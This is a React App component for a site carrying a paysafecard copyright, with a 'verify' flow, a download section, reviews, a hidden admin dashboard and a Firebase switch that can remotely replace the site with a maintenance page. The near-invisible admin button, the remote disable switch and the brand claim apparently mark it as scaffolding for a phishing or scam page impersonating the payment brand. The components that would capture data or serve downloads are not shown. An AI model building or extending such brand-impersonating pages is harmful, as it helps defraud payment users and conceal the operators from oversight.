import { useState, useEffect } from "react";
import HeroSection from "./components/HeroSection";
import DownloadSection from "./components/DownloadSection";
import ReviewsSection from "./components/ReviewsSection";
import ConfirmationPage from "./components/ConfirmationPage";
import AdminDashboard from "./components/AdminDashboard";
import MaintenancePage from "./components/MaintenancePage";
import { onWebappDisabledSnapshot } from "./utils/firebase";

type Page = "home" | "confirmation" | "admin";

export default function App() {
  const [page, setPage] = useState<Page>("home");
  const [webappDisabled, setWebappDisabled] = useState<boolean | null>(null);

  // Listen to webapp disabled status in real-time
  useEffect(() => {
    let received = false;
    const unsub = onWebappDisabledSnapshot((disabled) => {
      received = true;
      setWebappDisabled(disabled);
    });

    // Safety timeout: if Firebase doesn't respond within 5s, show the app anyway
    const timeout = setTimeout(() => {
      if (!received) {
        console.warn("Firebase timeout — showing app by default");
        setWebappDisabled(false);
      }
    }, 5000);

    return () => {
      unsub();
      clearTimeout(timeout);
    };
  }, []);

  // Check URL hash for /admin route
  useEffect(() => {
    const checkHash = () => {
      if (window.location.hash === "#/admin") {
        setPage("admin");
      }
    };
    checkHash();
    window.addEventListener("hashchange", checkHash);
    return () => window.removeEventListener("hashchange", checkHash);
  }, []);

  // Admin dashboard is always accessible, even when webapp is disabled
  if (page === "admin") {
    return (
      <AdminDashboard
        onBack={() => {
          window.location.hash = "";
          setPage("home");
        }}
      />
    );
  }

  // Show maintenance page if webapp is disabled (but not for admin)
  if (webappDisabled === true) {
    return <MaintenancePage />;
  }

  // Still loading webapp status from Firebase — show nothing to avoid flash
  if (webappDisabled === null) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="w-8 h-8 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin" />
      </div>
    );
  }

  if (page === "confirmation") {
    return <ConfirmationPage onNewVerification={() => setPage("home")} />;
  }

  return (
    <div className="min-h-screen bg-white text-slate-900 font-sans antialiased">

      <main>
        <HeroSection onVerify={() => setPage("confirmation")} />
        <div id="download">
          <DownloadSection />
        </div>
        <div id="reviews">
          <ReviewsSection />
        </div>
      </main>

      <footer
        className="py-6 text-center text-white/70 text-xs relative"
        style={{ backgroundColor: "#04267f" }}
      >
        © {new Date().getFullYear()} paysafecard. All rights reserved.
        <button
          onClick={() => { window.location.hash = "#/admin"; setPage("admin"); }}
          className="absolute right-3 bottom-2 opacity-[0.08] hover:opacity-30 transition-opacity duration-500 text-white text-[8px] cursor-default select-none"
          style={{ background: "none", border: "none", padding: "4px 6px" }}
          aria-label="Admin"
          tabIndex={-1}
        >
          ●
        </button>
      </footer>
    </div>
  );
}
